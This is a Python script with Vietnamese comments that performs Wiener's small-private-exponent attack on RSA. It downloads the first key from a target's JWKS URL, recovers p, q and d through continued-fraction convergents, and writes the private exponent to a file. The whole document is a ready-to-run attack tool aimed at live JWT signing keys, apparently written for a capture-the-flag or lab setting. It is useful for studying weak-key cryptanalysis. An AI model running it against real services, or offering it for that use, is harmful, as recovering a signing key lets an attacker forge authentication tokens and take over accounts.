#!/usr/bin/env python3
import sys
import requests
from math import isqrt
from fractions import Fraction
import base64
import json
from cryptography.hazmat.backends import default_backend
from math import isqrt

def continued_fraction(n, d):
    cf = []
    while d:
        q = n // d
        cf.append(q)
        n, d = d, n - q * d
    return cf

def convergents(cf):
    convs = []
    for i in range(len(cf)):
        frac = Fraction(0)
        for q in reversed(cf[:i+1]):
            frac = q + frac
            frac = 1 / frac if frac.denominator != 1 else frac
        convs.append(frac)
    return convs



def wiener_attack(e, n):
    print("[*] Running Wiener attack...")
    
    temp_e, temp_n = e, n
    
    # Khởi tạo các giá trị cho số hội tụ k/d (k_i/d_i)
    k_2, d_2 = 0, 1 # Bước i-2
    k_1, d_1 = 1, 0 # Bước i-1
    
    while True:
        if temp_n == 0: break
        
        q = temp_e // temp_n
        r = temp_e % temp_n
        
        # Tính số hội tụ hiện tại (k_i, d_i) theo công thức truy hồi
        k_i = q * k_1 + k_2
        d_i = q * d_1 + d_2
        
        # Thử nghiệm với mẫu số d_i hiện tại (d tiềm năng)
        d = d_i
        k = k_i
        
        # Điều kiện cần: e*d - 1 chia hết cho k
        if k != 0 and (e * d - 1) % k == 0:
            phi = (e * d - 1) // k
            
            # Giải phương trình x^2 - bx + n = 0 với b = n - phi + 1
            b = n - phi + 1
            delta = b*b - 4*n
            
            if delta > 0:
                s = isqrt(delta)
                # Kiểm tra delta có phải số chính phương và b+s có chẵn không
                if s*s == delta and (b + s) % 2 == 0:
                    # Nghiệm của phương trình bậc hai
                    p = (b + s) // 2
                    q = (b - s) // 2
                    
                    # Kiểm tra lại xem p*q có thực sự bằng n không
                    if p * q == n:
                        print("[+] SUCCESS! Private key components recovered.")
                        return int(p), int(q), int(d)
        
        # Cập nhật cho bước tiếp theo
        temp_e, temp_n = temp_n, r
        k_2, d_2 = k_1, d_1
        k_1, d_1 = k_i, d_i
        
    print("[-] Wiener attack failed: d is likely too large.")
    return None, None, None



def get_rsa_from_jwks(url):
    print(f"[+] Fetching JWKS from {url}")
    r = requests.get(url)
    jwks = r.json()
    key = jwks["keys"][0]

    n = int.from_bytes(base64.urlsafe_b64decode(key["n"] + "=="), "big")
    e = int.from_bytes(base64.urlsafe_b64decode(key["e"] + "=="), "big")

    print(f"[+] n = {hex(n)[:60]}...")
    print(f"[+] e = {e}")
    return n, e

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python wiener_attack.py <jwks_url>")
        sys.exit(1)

    url = sys.argv[1]
    n, e = get_rsa_from_jwks(url)

    p, q, d = wiener_attack(e, n)
    if d:
        print(f"[+] Private exponent d = {hex(d)}")
        with open("recovered_d.txt", "w") as f:
            f.write(str(d))
        print("[+] Saved recovered_d.txt")
    else:
        print("[-] Wiener attack failed")
